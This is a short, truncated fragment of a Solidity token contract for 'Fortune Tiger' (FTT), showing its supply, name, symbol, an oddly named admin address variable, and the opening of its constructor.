...
contract FTTTOKEN is Ownable {
    address public dxxszv543;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Fortune Tiger";
    string private _cctokensymbol = "FTT";
    constructor(address tokenadmin) {
        dxxszv543 = tokenadmin;
